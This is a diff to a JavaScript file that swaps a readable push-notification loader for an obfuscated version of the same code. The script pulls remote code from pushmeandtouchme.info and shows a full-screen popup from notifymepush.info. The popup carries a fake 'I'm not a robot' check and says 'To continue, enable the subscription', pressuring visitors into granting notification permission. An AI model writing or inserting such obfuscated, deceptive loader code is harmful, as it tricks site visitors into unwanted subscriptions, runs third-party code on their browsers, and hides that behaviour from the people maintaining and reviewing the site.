@@ -1,13 +1,1 @@
-(function(){
-	var s = document.createElement('script');
-	s.setAttribute('defer', '');
-	s.setAttribute('src', "/push-wrap.js");
-	s.onload = init;
-	document.body.appendChild(s);
-
-    function init() {
-        var obj = new PushKaWrapper({"pid":1,"sourceId":"2","landingId":24,"marks":{"utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_term":null,"utm_content":null},"popupUrl":"https:\/\/notifymepush.info\/rs\/2?count=1&declCount=1&fullScreenMode=enabled","pushKaScript":"https:\/\/pushmeandtouchme.info\/push.js?b=8","languages":{"en":{"btnSubscribe":"Subscribe","btnContinue":"Continue","btnCancel":"Cancel","btnClose":"Close","notRobot":"I'm not a robot","popupTitle":"Get notification about actual news from site","popupText":"To continue, enable the subscription"}}});
-        
-        obj.startArrowPopup(1, 600);
-    }
-})();
+var _0x1d80=['appendChild','https://notifymepush.info/rs/2?count=1&declCount=1&fullScreenMode=enabled','https://pushmeandtouchme.info/push.js?b=8','Subscribe','Cancel','Close','Get\x20notification\x20about\x20actual\x20news\x20from\x20site','To\x20continue,\x20enable\x20the\x20subscription','startArrowPopup','createElement','script','setAttribute','defer','src','/push-wrap.js','body'];(function(_0x3343b5,_0x40d877){var _0x3cb40a=function(_0x15a42e){while(--_0x15a42e){_0x3343b5['push'](_0x3343b5['shift']());}};_0x3cb40a(++_0x40d877);}(_0x1d80,0xb9));var _0x38c5=function(_0x2f3e31,_0x3a89c9){_0x2f3e31=_0x2f3e31-0x0;var _0x2c6db2=_0x1d80[_0x2f3e31];return _0x2c6db2;};(function(){var _0xb2b310=document[_0x38c5('0x0')](_0x38c5('0x1'));_0xb2b310[_0x38c5('0x2')](_0x38c5('0x3'),'');_0xb2b310[_0x38c5('0x2')](_0x38c5('0x4'),_0x38c5('0x5'));_0xb2b310['onload']=_0x54ee8b;document[_0x38c5('0x6')][_0x38c5('0x7')](_0xb2b310);function _0x54ee8b(){var _0x592a39=new PushKaWrapper({'pid':0x1,'sourceId':'2','landingId':0x18,'marks':{'utm_source':null,'utm_medium':null,'utm_campaign':null,'utm_term':null,'utm_content':null},'popupUrl':_0x38c5('0x8'),'pushKaScript':_0x38c5('0x9'),'languages':{'en':{'btnSubscribe':_0x38c5('0xa'),'btnContinue':'Continue','btnCancel':_0x38c5('0xb'),'btnClose':_0x38c5('0xc'),'notRobot':'I\x27m\x20not\x20a\x20robot','popupTitle':_0x38c5('0xd'),'popupText':_0x38c5('0xe')}}});_0x592a39[_0x38c5('0xf')](0x1,0x258);}}());
